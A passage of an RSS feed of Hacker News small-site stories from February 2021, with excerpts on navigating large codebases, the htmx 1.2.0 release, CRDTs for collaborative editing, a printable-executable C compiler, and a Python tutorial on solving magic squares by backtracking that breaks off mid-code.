<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 10]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 10. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Tue, 16 Feb 2021 08:34:10 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-10.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Tue, 16 Feb 2021 08:34:10 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[On Navigating a Large Codebase]]>
            </title>
            <description>
<![CDATA[
Score 130 | Comments 49 (<a href="https://news.ycombinator.com/item?id=26129190">thread link</a>) | @mooreds
<br/>
February 13, 2021 | https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/ | <a href="https://web.archive.org/web/*/https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A while ago, I’ve been working on a very large codebase that consisted of a few million lines of code.
Large systems are usually a big mess and this one was no exception.
Since this is a rather common problem in software engineering, I thought the internet would be
littered with stories about this topic.
There is a lot of talk about software carpentry, while software maintenance is rarely debated.
Either large programs are being maintained by dark matter developers or
nobody thinks that writing stories about large systems are interesting enough.</p><p>In the past I’ve encountered a few of those large monsters and they seem to have a lot in common.
This article will try to present some of the problems and tricks that I am using when
I have to deal with them. Hopefully this will inspire others to write similar posts
and share tips from their own bag of tricks.</p><h2 id="large-codebase-problems">Large codebase problems</h2><p>The main problem of any large codebase is the extreme complexity that stems from the fact
that we live in a messy world of details that are very hard to describe and put into words.
The programming languages that we are using nowadays are still too primitive for that task,
and it takes a lot of lines and various layers of abstractions before we are able to convey the
rules of our world to the all mighty computer [1].</p><p>The following sections will present some of the common problems which I’ve discovered during my
big system adventures.</p><p>A common trait of a large codebases is that at some point they become so large and bloated
that one person alone is no longer capable of understanding all its pieces. It seems to
me that after 100’000 lines of code, the maintenance related problems start to appear
as the complexity of the code simply dwarfs the capabilities of the human brain.
Such large systems are commonly maintained by more than one person, but with a large
group of people also come large organizational problems.</p><p>Within a large group of people the number of possible communication paths between them go bananas
and so it often happens that the ass no longer knows what the head is doing.
This misunderstanding in turn cause them to build the wrong thing that doesn’t fit
into the rest of the system. You might also know this situation under the term of
“those people had no idea what they were doing, and we will do it right this time” which is
quite often floating around in the latest maintenance team.</p><p>That rarely happens though, because it’s likely the Towel of Babel situation all over again.</p><h3 id="loss-of-knowledge">Loss of knowledge</h3><p>Large systems are usually maintained by the ones who did not build them. Initial
developers often leave the company or move up in the pecking order to
work on other projects and are therefore no longer familiar with the system.
Sometimes the bright minds outsourced the initial development of the project
in the name of lowering the costs, just to pay tenfold in the later stages once they realize
the outsourcers developed the wrong thing. Even worse is the fact that the in house developers
didn’t gain the internal domain knowledge that is necessary for further maintenance of the system.</p><p>This presents a big problem for the new maintainers, as they can’t just go
around the company and ask the original developers about the initial design decisions.
Learning this tribal knowledge usually takes a lot of time, because the code is harder to read and
understand than it is to write. These days most developers seem to switch jobs every 2 to 3 years,
therefore the learning process has to be constantly going on, otherwise you might end up
with a large and expensive monster that nobody knows anything about [2].
For most of the past large projects on which I’ve been working on, the team has usually
changed by the end of the first version.</p><p>Rigorously documenting every step is not the cure for this problem, because at some point all that
junk will become outdated and nobody will have the time to spend a year just reading the
documentation and figuring out how the pieces fit together [3].</p><h3 id="lack-of-knowledge">Lack of knowledge</h3><p>Large systems become large, because they are usually trying to solve every problem under the sun.
Often the organization that is embarking on such journey does not have enough experienced
employees on board to actually pull it off. Some like to say that pressure makes diamonds,
but sometimes it also crushes the things that are under.</p><p>It’s fine to have less experienced people working on a large system as long as they have the elders
overseeing their work. In the world where senior titles are handed left and right,
that is often not the case and it’s how you end up with a very fragile system that is suitable for
a replacement as soon as it was built. Most of the larger projects that I was working on and
were considered successes, had the core parts of the system written by experienced
developers. A significant chunks were also built by greenhorns, but they were usually
guided and their blast radius was limited to the less complex parts of the system.</p><h3 id="the-astronauts">The astronauts</h3><p>Big projects tend to attract the data modelers and other cultists who like to
get in the way of getting shit done. These architecture astronauts will endlessly
discuss the finer points of their UML data models and multithreaded layers of abstraction,
that will one day allow them to be the heroes of their own story by writing some well
encapsulated and “SOLID” code.</p><blockquote><p>Why IBM sales reps don’t have children?</p><p>Because all they do is sit on the bed telling their spouses how great it’s going to be.</p></blockquote><p>Meanwhile, the for loopers have to fight this creeping metadata bureaucracy
madness on a daily basis. The tools handed down to them from the ivory tower usually don’t stand
the heat of the battle, but that doesn’t bother the modelers who will try to fix
the problems with more obfuscation patterns. It’s how you end with a homebrewed middleware monstrosity,
because the 100 existing ones out there are obviously not up to the task of powering our little CRUD app.</p><h3 id="documentation-problems">Documentation problems</h3><blockquote><p>I like to keep documentation separated from the code. Who am I?</p><p>A fool, with an out of sync document.</p></blockquote><p>The documentation of any large system is almost always outdated.
The code is usually changing faster due to the endless edge cases of the system
that were not being thought of early on. The discovered edge case problems are
usually fixed by bolting additional functionality right on the spot.
The average code change of such patch is usually quite small,
but a few tweaks here and there accumulate over time until the original design no
longer matches with the reality.</p><p>Tweaking the code is usually simple as most people are familiar with the process. You pull the
code from the version control, you make your tweaks and then you push it back.
On the other hand updating the documentation is way more convoluted and usually involves the
whole ceremony, because the term documentation is actually a spaghetti of Word documents,
pdfs, spreadsheets, emails, wiki pages and some text files on some dude’s hard drive.</p><p>The corporate world still loves to use MS Word for writing technical documents, even though
it’s entirely unusable for this use case. The Word doesn’t support syntax highlighting for
code snippets and you get to play the game of “moving one image for 5 pixels to the
left will mess with your headings and right align all text.”
It also makes it very hard to have multiple people collaborating on the same document.
The version control still treats Word documents in the same way as binary blobs,
which makes merging changes and fixing merge conflicts far harder than it should be.
I still remember how people collaborated by working each on their own copy of the
document and having a documentation officer merging all the copies together
manually to avoid any merge conflicts. Fun times.</p><p>If you are lucky, you might be writing documentation in plain text, but then you may have to
get familiar with all kinds of weird Lovecraftian toolchains that are relying on
all sorts of ancient operating system specifics in order to produce a nicer looking document.</p><p>After all these years of progress, writing documentation is still an unpleasant process
due to all the pain surrounding the tools that we have to deal with on a daily basis.
Large projects ensure that not only is the documentation hard to write, it’s also
impossible to find and read due to the sheer number of documents [4].</p><h2 id="tackling-the-beast">Tackling the beast</h2><p>In this section I will describe my ways of tackling the problems of an unknown large codebase
that I often encounter in the wild.
As mentioned before, the main problem of large systems is that nobody can understand them
entirely and often you will be left wondering how the damn thing even works.</p><p>When you are trying to understand a specific part of a large system, it’s worth
taking the time to talk to the current maintainers. They usually know it well enough
to guide you through the jungle, so you can avoid the traps and get up to speed faster.
Sometimes you will encounter a situation where you will just have to figure it
out on your own, because nobody will have the answers to your questions.</p><p>Hopefully the following sections might give you some ideas on how to tackle such
situations.</p><h3 id="read-the-documentation">Read the documentation</h3><p>The easiest way to get familiar with a large system, is by going through its documentation and
actually reading it. Large systems usually contain
large swaths of outdated documentation, but even a slightly outdated document is
often better than not having it at all. Ask the elders about the current state of documentation,
so you don’t completely waste your time with deciphering the irrelevant documents.</p><p>Either way, the documentation will only give you an overview of the system. The details
behind design decisions are almost never mentioned and you will have to find another way.</p><h3 id="check-the-tests">Check the tests</h3><p>When I am trying to decipher how a specific part of the system is supposed to behave,
I usually check for tests. If they exist, you might want to scroll through them and hopefully
you will get another …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/">https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/</a></em></p>]]>
            </description>
            <link>https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26129190</guid>
            <pubDate>Sun, 14 Feb 2021 02:41:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Htmx 1.2.0 Release]]>
            </title>
            <description>
<![CDATA[
Score 116 | Comments 18 (<a href="https://news.ycombinator.com/item?id=26128229">thread link</a>) | @crbelaus
<br/>
February 13, 2021 | https://htmx.org/posts/2021-2-13-htmx-1.2.0-is-released/ | <a href="https://web.archive.org/web/*/https://htmx.org/posts/2021-2-13-htmx-1.2.0-is-released/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <h2>htmx 1.2.0 Release</h2>
<p>I'm happy to announce the <a href="https://unpkg.com/browse/htmx.org@1.2.0/">1.2.0 release</a> of htmx.</p>
<h3>New Features &amp; Major Changes</h3>
<ul>
<li><code>hx-vars</code> has been deprecated in favor of <code>hx-vals</code></li>
<li><code>hx-vals</code> now supports a <code>javascript:</code> prefix to achieve the behavior that <code>hx-vars</code> provided</li>
<li>The new <code>hx-headers</code> attribute allows you to add headers to a request via an attribute.  Like <code>hx-vals</code> it supports
JSON or javascript via the <code>javascript:</code> prefix</li>
<li><code>hx-include</code> will now include all inputs under an element, even if that element is not a form tag</li>
<li>The <a href="https://htmx.org/extensions/preload/">preload extension</a> now offers a <code>preload-images="true"</code> attribute that will aggressively load images in preloaded content</li>
<li>On requests driven by a history cache miss, the new <code>HX-History-Restore-Request</code> header is included so that the server
can differentiate between history requests and normal requests</li>
</ul>
<h3>Improvements &amp; Bug fixes</h3>
<ul>
<li>Improved handling of precedence of input values to favor the enclosing form (see <a href="https://github.com/bigskysoftware/htmx/commit/a10e43d619dc340aa324d37772c06a69a2f47ec9">here</a>)</li>
<li>Moved event filtering logic <em>after</em> <code>preventDefault</code> so filtering still allows events to be properly handled</li>
<li>No longer trigger after swap events on elements that have been removed via an <code>outerHTML</code> swap</li>
<li>Properly remove event handlers added to other elements when an element is removed from the DOM</li>
<li>Handle the <code>scroll:</code> modifier in <code>hx-swap</code> properly when an <code>outerHTML</code> swap occurs</li>
<li>Lots of docs fixes</li>
</ul>
<p>Enjoy!</p>

</div></div>]]>
            </description>
            <link>https://htmx.org/posts/2021-2-13-htmx-1.2.0-is-released/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26128229</guid>
            <pubDate>Sat, 13 Feb 2021 23:51:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data Laced with History: Causal Trees and Operational CRDTs (2018)]]>
            </title>
            <description>
<![CDATA[
Score 72 | Comments 5 (<a href="https://news.ycombinator.com/item?id=26127570">thread link</a>) | @mcovalt
<br/>
February 13, 2021 | http://archagon.net/blog/2018/03/24/data-laced-with-history/ | <a href="https://web.archive.org/web/*/http://archagon.net/blog/2018/03/24/data-laced-with-history/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<div id="sel_blog20180324data-laced-with-history">
<div>



<article>


<p><img src="http://archagon.net/images/blog/causal-trees/header.jpg"></p>

<p>Hello! This article took a while to cobble together. If you find it useful, please consider leaving a donation via <a href="https://donorbox.org/crdt-article"> </a>, <a href="https://www.buymeacoffee.com/archagon"> </a>, or <a href="ethereum:0x0d5dd8a8Cca8Bf7d0122F7A1Cc76c6b0666fCC56"> </a>. (Thought I'd try something new!) Or, just buy yourself a nice Roost through my <a href="http://amzn.to/2D7uYxz"> </a>. Donation or not, thank you for reading! 😊</p>

<p>(Sorry about the length! At some point in the distant past, this was supposed to be a short blog post. If you like, you can skip straight to the <a href="#demo-concurrent-editing-in-macos-and-ios">demo section</a> to get a sense of what this article is about.)</p>

<p>Embarrassingly, most of my app development to date has been confined to local devices. Programmers like to gloat about the stupendous mental castles they build of their circuitous, multi-level architectures, but not me. In truth, networks leave me quite perplexed. I start thinking about data serializing to bits, servers performing their arcane handshakes and voting rituals, merge conflicts pushing into app-space and starting the whole process over again—and it all just turns to mush in my head. For peace of mind, my code needs to be <em>locally provable</em>, and this means things like idempotent functions, decoupled modules, contiguous data structures, immutable objects. Networks, unfortunately, throw a giant wrench in the works.</p>

<p>Sometime last year, after realizing that most of my document-based apps would probably need to support sync and collaboration in the future, I decided to finally take a stab at the problem. Granted, there were tons of frameworks that promised to do the hard work of data model replication for me, but I didn’t want to black-box the most important part of my code. My gut told me that there had to be some arcane bit of foundational knowledge that would allow me to sync my documents in a refined and functional way, decoupled from the stateful spaghetti of the underlying network layer. Instead of downloading a Github framework and <a href="http://amzn.to/2iigBOI">smacking the build button</a>, I wanted to develop a base set of skills that would allow me to easily network <em>any</em> document-based app in the future, even if I was starting from scratch.</p>

<!--more-->

<p>The first order of business was to devise a wishlist for my fantastical system:</p>

<ul>
  <li>Most obviously, users should be able to edit their documents immediately, without even touching the network. (In other words, the system should only require <em>optimistic concurrency</em>.)</li>
  <li>Sync should happen in the background, entirely separate from the main application code, and any remote changes should be seamlessly integrated in real-time. (The user shouldn’t have to notice that the network is down.)</li>
  <li>Merge should always be automatic, even for concurrent edits. The user should never be faced with a “pick the correct revision” dialog box.</li>
  <li>A user should be able to work on their document offline for an indefinite period of time without accruing “sync debt”. (Meaning that if, for example, sync is accomplished by sending out mutation events, performance should not suffer even if the user spends a month offline and then sends all their hundreds of changes at once.)</li>
  <li>Secondary data structures and state should be minimized. Most of the extra information required for sync should be stored in the same place as the document, and moving the document to a new device should not break sync. (No out-of-band metadata or caches!)</li>
  <li>Network back-and-forth should be condensed to a bare minimum, and rollbacks and re-syncs should practically never happen. To the greatest possible degree, network communication should be stateless and dumb.</li>
  <li>To top it all off, my chosen technique had to pass the “PhD Test”. That is to say, one shouldn’t need a PhD to understand and implement the chosen approach for custom data models!</li>
</ul>

<p>After mulling over my bullet points, it occurred to me that the network problems I was dealing with—background cloud sync, editing across multiple devices, real-time collaboration, offline support, and reconciliation of distant or conflicting revisions—were all pointing to the same question: was it possible to design a system where any two revisions of the same document could be merged deterministically and sensibly without requiring user intervention? Sync, per se, wasn’t the issue, since getting data from one device to another was essentially a solved problem. It’s what happened <em>after</em> sync that was troubling. On encountering a merge conflict, you’d be thrown into a busy conversation between the network, model, persistence, and UI layers just to get back into a consistent state. The data couldn’t be left alone to live its peaceful, functional life: every concurrent edit immediately became a cross-architectural matter. On the other hand, if two documents could always be made to merge, then most of that coordination hullabaloo could go out the window. Each part of the system could be made to work at its own pace.</p>

<p>Whether stored as a record in a database or as a stand-alone file, a document could be interpreted as a collection of basic data fields: registers, sequences, dictionaries, and so forth. Looking at the problem from a database perspective, it was actually quite simple to automatically resolve merge conflicts in this kind of table row: just keep overwriting each field with the version sporting the highest timestamp, <a href="https://en.wikipedia.org/wiki/Lamport_timestamps">logical</a> or otherwise. (Ignoring issues of inter-field consistency for now.) Of course, for anything other than basic registers, this was a terrible approach. Sequences and dictionaries weren’t just blobs of homogeneous data that were overwritten with every change, but complex, mutable structures that users were editing on a granular level. For such a fundamental problem, there was a surprising dearth of solutions out in the real world: most systems punted the task to app-space by asking the client to manually fix any merge conflicts or pick the correct version of a file. It seemed that if the problem of automatic merge for non-trivial data types could be solved—perhaps by exposing their local, type-specific mutation vocabulary to the storage and replication layers?—then a solution to the higher-level problem of automatic document merge would fall within reach.</p>

<p>In hope of uncovering some prior art, I started by looking at the proven leader in the field, Google Docs. Venturing down the deep rabbit hole of <a href="https://en.wikipedia.org/wiki/Collaborative_real-time_editor">real-time collaborative editing</a> techniques, I discovered that many of the problems I faced fell under the umbrella of <a href="https://en.wikipedia.org/wiki/Eventual_consistency">strong eventual consistency</a>. Unlike the more conventional <a href="https://en.wikipedia.org/wiki/Strong_consistency">strong consistency</a> model, where all clients receive changes in identical order and rely on locking to some degree, strong <em>eventual</em> consistency allows clients to individually diverge and then arrive at a final, consistent result once each update has been received. (Or, in a word, when the network is <em>quiescent</em>.)</p>

<p>There were a number of tantalizing techniques to investigate, and I kept several questions in mind while doing my analysis. Could a given technique be generalized to arbitrary and novel data types? Did the technique pass the PhD Test? And was it possible to use the technique in an architecture with smart clients and dumb servers?</p>

<p>The reason for that last question was CloudKit Sharing, a framework introduced in iOS 10. For the most part, this framework functioned as a superset of regular CloudKit, requiring only minor code changes to enable document sharing in an app. A developer didn’t even have to worry about connecting users or dealing with UI: Apple did most of the hard work in the background while leveraging standard system dialogs. But almost two years later, <a href="https://github.com/search?l=Swift&amp;q=UICloudSharingController&amp;type=Code&amp;utf8=%E2%9C%93">on the order of no one</a> seemed to be using it. Why was this? Most other Apple APIs tended to be readily adopted, especially when they allowed the developer to expand into system areas which were normally out of bounds.</p>

<p>My hunch was that CloudKit Sharing forced the issue of real-time collaboration over a relatively dumb channel, which was a task outside the purview of conventional sync approaches. CloudKit allowed developers to easily store, retrieve, and listen for new data, but not much else besides. No third-party code was allowed to run on Apple’s servers, so merge conflicts had to be handled locally. But unlike in the single-user case, which presented limited opportunities for concurrent edits, you couldn’t just pop up a merge dialog every time another participant in your share made a change to your open document. The only remaining options seemed to be some sort of ugly, heuristic auto-merge or data-dropping last-write-wins, neither of which was acceptable for real-time use. Collaboration along the lines of Google Docs appeared to be impossible using this system! But was it really?</p>

<p>I realized that this was my prize to be won. If I could figure out a way to develop auto-merging documents, I’d be able to implement sync and collaboration in my apps over CloudKit while using Apple’s first-party sharing UI—all without having to pay for or manage my own servers. So this became my ultimate research goal: a collaborative iPhone text editing demo that synced entirely over CloudKit. (And here’s a spoiler: <a href="#demo-concurrent-editing-in-macos-and-ios">it worked!</a>)</p>





<p>There are a few basic terms critical to understanding eventual consistency. A network is comprised of <em>sites</em> (“devices”, “peers”) operating in parallel, each one producing <em>operations</em> (“events”, “actions”) that mutate the data and exchange information with other sites. The first vital concept here is <strong>causality</strong>. An operation is <em>caused</em> by another operation when it directly modifies or otherwise involves the results of that operation, and determining causality is critical to reconstructing a sensible timeline (or <strong>linearization</strong>) of operations across the network. (An operation that <em>causes</em> another operation must always be ordered first.) However, we can’t always determine direct causality in a general way, so algorithms often assume that an operation is causally ahead of another one if the site generating the newer operation has already seen the older one at the time of its creation. (In other words, every operation already seen by a site at the time a new operation is created is in that operation’s <em>caus…</em></p></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://archagon.net/blog/2018/03/24/data-laced-with-history/">http://archagon.net/blog/2018/03/24/data-laced-with-history/</a></em></p>]]>
            </description>
            <link>http://archagon.net/blog/2018/03/24/data-laced-with-history/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127570</guid>
            <pubDate>Sat, 13 Feb 2021 22:25:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[C compiler for producing completely printable DOS executables]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26127161">thread link</a>) | @jstrieb
<br/>
February 13, 2021 | http://tom7.org/abc/ | <a href="https://web.archive.org/web/*/http://tom7.org/abc/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
<p>
ZM~~&nbsp;#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PRinty#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C&nbsp;with&nbsp;ABC!
</p>

<p>Hi! For <a href="http://sigbovik.org/2016/">SIGBOVIK 2017</a>, I created a strange <a href="http://tom7.org/abc/paper.pdf">paper</a>. This one may be a bit impenetrable for non computer scientists. If you have the time, I think reading the paper is the best way to experience it. But I also created the following video that explains the ideas involved, for interested non-experts or patient experts. It's long, at about 25 minutes, but you can always just skip to the end:

<iframe width="853" height="480" src="https://www.youtube.com/embed/LA_DrBwkiJA" frameborder="0" allowfullscreen=""></iframe>

</p><p>The paper in raw form is available as <a href="http://tom7.org/abc/paper.exe">PAPER.EXE</a> or <a href="http://tom7.org/abc/paper.txt">PAPER.TXT</a> (same file). Due to unreasonable SIGBOVIK deadlines, it's been updated a little compared to the version that appeared in SIGBOVIK 2017 (<a href="http://tom7.org/abc/abc.bib">bibtex</a>).

</p><p>The source code I used to create the paper is <a href="http://sourceforge.net/p/tom7misc/svn/HEAD/tree/trunk/abc/">here</a>.</p>

<p>Please leave a comment <a href="http://radar.spacebar.org/">on my blog</a> or on Twitter at <a href="http://twitter.com/tom7">@tom7</a>!
</p><p>Get all Tom 7 thingos at → [<a href="http://tom7.org/">tom7.org</a>]</p>

</div></div></div>]]>
            </description>
            <link>http://tom7.org/abc/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127161</guid>
            <pubDate>Sat, 13 Feb 2021 21:34:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Bestsnip – Draw animations online with automatic inbetweening]]>
            </title>
            <description>
<![CDATA[
Score 47 | Comments 18 (<a href="https://news.ycombinator.com/item?id=26126906">thread link</a>) | @nevernothing
<br/>
February 13, 2021 | https://bestsnip.com/animation/ | <a href="https://web.archive.org/web/*/https://bestsnip.com/animation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://bestsnip.com/animation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126906</guid>
            <pubDate>Sat, 13 Feb 2021 21:05:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Solving Magic Squares Using Backtracking]]>
            </title>
            <description>
<![CDATA[
Score 41 | Comments 5 (<a href="https://news.ycombinator.com/item?id=26126652">thread link</a>) | @jpskycak
<br/>
February 13, 2021 | http://www.eurisko.us/solving-magic-squares-using-backtracking/ | <a href="https://web.archive.org/web/*/http://www.eurisko.us/solving-magic-squares-using-backtracking/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><header><!--<p class="page__meta"><i class="fa fa-clock-o" aria-hidden="true"></i> 12 minute read</p>--> <!--<p class="page__meta"><time datetime="2020-12-21T00:00:00-08:00">December 21, 2020</time></p>--><p>By <a target="_blank" href="https://eurisko-us.github.io/elijah-tarr">Elijah Tarr</a> on <time datetime="2020-12-21T00:00:00-08:00">December 21, 2020</time></p><!--<p class="page__date"><strong><i class="fa fa-fw fa-calendar" aria-hidden="true"></i> Published:</strong> <time datetime="2020-12-21T00:00:00-08:00">December 21, 2020</time></p>--></header><section itemprop="text"><div><p>A magic square can be thought of as a matrix with specific rows, columns, and diagonals adding up to the same number, called the magic constant. For an $n \times n$ magic square, the magic constant is</p><center> $\begin{align*} \dfrac{1}{n} \sum_{k=1}^{n^2} k \end{align*}$ </center><p>For example, a magic square with dimensions $3 \times 3$ would have magic constant $15,$ and dimensions $4 \times 4$ would have magic constant $34.$</p><p>To solve a magic square, we must fill in each element with a number in ${1, 2, \ldots, n^2 },$ and each number must appear exactly once. A $3 \times 3$ magic square could look like this:</p><center> $\begin{align*} \begin{bmatrix} 2 &amp; 7 &amp; 6 \\ 9 &amp; 5 &amp; 1 \\ 4 &amp; 3 &amp; 8 \end{bmatrix} \end{align*}$ </center><p>Or this:</p><center> $\begin{align*} \begin{bmatrix} 8 &amp; 3 &amp; 4 \\ 1 &amp; 5 &amp; 9 \\ 6 &amp; 7 &amp; 2 \end{bmatrix} \end{align*}$ </center><p>It may seem like a $3 \times 3$ magic square can have multiple solutions. But looking closer allows us to see that the two matrices above are actually both the same configuration. The second matrix is just the first matrix rotated $180$ degrees. In general, rotating and flipping a magic square in any direction will still yield a valid magic square.</p><h2>Solving a Magic Square Using Brute Force</h2><p>How can we build a program to construct one of these magic squares?</p><p>Just like every problem, the simplest way to solve a magic square is to use brute force. It will be the most inefficient solution we can think of, but it will give us some grounding to see which areas we need to improve it in. To get some code down, we can write something like this:</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>gen_magic_square</span>():
    <span>for</span> x1 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
        <span>for</span> x2 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
            <span>for</span> x3 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                <span>for</span> x4 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                    <span>for</span> x5 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                        <span>for</span> x6 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                            <span>for</span> x7 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                <span>for</span> x8 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                    <span>for</span> x9 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                        square <span>=</span> [[x1, x2, x3],
                                                  [x4, x5, x6],
                                                  [x7, x8, x9]]
                                        <span>if</span> is_valid(square, <span>15</span>):
                                            <span>return</span> square
</pre></div></span></p><p>The classic $9$-nested-for-loop approach. It is quite inefficient, but it will do the job. Each $x_k$ variable represents a space in the square. There are 9 spaces, so we nest $9$ loops, $1$ for each space. Each loop will loop through all the possible numbers in that space, $1$ through $9.$</p><p>To write the <code>is_valid</code> function, we need to check for duplicate values, which can easily be done with the use of a set. Then we have to check if each row, column, and diagonal adds up to a certain number, so we can just make a list of all those and check if they are equal to $15$ at the end.</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>is_valid</span>(square, n):
    vals <span>=</span> [entry <span>for</span> row <span>in</span> square <span>for</span> entry <span>in</span> row <span>if</span> entry <span>!=</span> <span>None</span>]
    <span>if</span> <span>len</span>(<span>set</span>(vals)) <span>&lt;</span> <span>len</span>(vals): <span># check for duplicates</span>
        <span>return</span> <span>False</span>
        
    num_rows <span>=</span> <span>len</span>(square)
    arrs <span>=</span> square \ <span># rows</span>
        <span>+</span> [<span>list</span>(arr) <span>for</span> arr <span>in</span> <span>zip</span>(<span>*</span>square)] \ <span># columns</span>
        <span>+</span> [square[i][i] <span>for</span> i <span>in</span> <span>range</span>(<span>len</span>(square))] <span># main diagonal</span>
        <span>+</span> [square[i][num_rows<span>-</span>i<span>-</span><span>1</span>] <span>for</span> i <span>in</span> <span>range</span>(num_rows)] <span># anti-diagonal</span>
        
    <span>return</span> <span>all</span>(<span>sum</span>(arr) <span>==</span> n <span>for</span> arr <span>in</span> arrs <span>if</span> <span>None</span> <span>not</span> <span>in</span> r)
</pre></div></span></p><p>Because I want this function to be able to run on squares larger than just $3 \times 3,$ I pass in the constant as $n$. For a $3 \times 3$ square, we would set $n=15.$ For a $4 \times 4$ square, we would set $n=34.$</p><h2>Brute Force Takes Forever!</h2><p>Let’s talk about timing. We have $9$ nested for loops, and the <code>is_valid</code> operation is in the deepest one. Since each loop is going to run $9$ times to test each number $1-9$ in each element of the square, it’s going to run the <code>is_valid</code> function $9^9$ times, which is absolutely insane.</p><p>Using Python’s <code>timeit</code> module, we can see how long the <code>is_valid</code> function takes to run:</p><ul><li>$1.6 \, \mu\textrm{s}$ to run if there are duplicate values</li><li>$5.3 \, \mu\textrm{s}$ to run if there are no duplicate values</li><li>$6.3 \, \mu\textrm{s}$ to run if the square is valid</li></ul><p>With this brute force algorithm, we can expect that the vast majority of iterations are going to have duplicate values in them. So, I’ll be generous and say that each time it runs, $1.6 \, \mu\textrm{s}$ pass. That means the amount of time it takes is $9^9 \times 1.6 \textrm{ usecs} \sim 10.3 \textrm{ minutes}.$</p><p>What if we wanted a $4 \times 4$ magic square? Well, we can use the equation again: $16^{16} \times 1.6 \mu\textrm{s} \sim \textbf{600 millennia}.$ It’s very unlikely that the human race will even exist for that long; we might have destroyed the earth along with the computer that was running this algorithm by then. We need to write a more efficient algorithm.</p><h2>Backtracking</h2><p>The problem with brute force is that it spends too much time looking through solutions that will never work. For example, the algorithm starts out with the square</p><center> $\begin{align*} \begin{bmatrix} 1 &amp; 1 &amp; 1\\ 1 &amp; 1 &amp; 1 \\ 1 &amp; 1 &amp; 1 \end{bmatrix}, \end{align*}$ </center><p>and then advances to</p><center> $\begin{align*} \begin{bmatrix} 1 &amp; 1 &amp; 1\\ 1 &amp; 1 &amp; 1 \\ 1 &amp; 1 &amp; 2 \end{bmatrix}, \end{align*}$ </center><p>and then</p><center> $\begin{align*} \begin{bmatrix} 1 &amp; 1 &amp; 1\\ 1 &amp; 1 &amp; 1 \\ 1 &amp; 1 &amp; 3 \end{bmatrix}. \end{align*}$ </center><p>There’s absolutely no point in checking any square with the first $3$ numbers as $1$ because we’re not allowed to have duplicates.</p><p>To avoid configurations like $1,1,1$ as the top row, we can use a technique called <b>backtracking</b>. Whenever we reach a configuration that won’t work, we “backtrack” and skip over that configuration instead of wasting tons of time modifying it in ways that will never make it valid.</p><p>Using backtracking, we would skip over all configurations that have duplicates, and instead start out with</p><center> $\begin{align*} \begin{bmatrix} 1 &amp; 2 &amp; 3\\ 4 &amp; 5 &amp; 6 \\ 7 &amp; 8 &amp; 9 \end{bmatrix}. \end{align*}$ </center><p>To implement backtracking, we’ll start by skipping over configurations with duplicates. In each for loop, before entering the next loop, we will check if the number has been duplicated anywhere. We will only check the rest of the square if the number isn’t duplicated. Implementing this, we end up with the following code:</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>gen_magic_square</span>()
    <span>for</span> x1 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
        <span>for</span> x2 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
            <span>if</span> x2 <span>in</span> [x1]:
                <span>continue</span>
            <span>for</span> x3 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                <span>if</span> x3 <span>in</span> [x1, x2]:
                    <span>continue</span>
                <span>for</span> x4 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
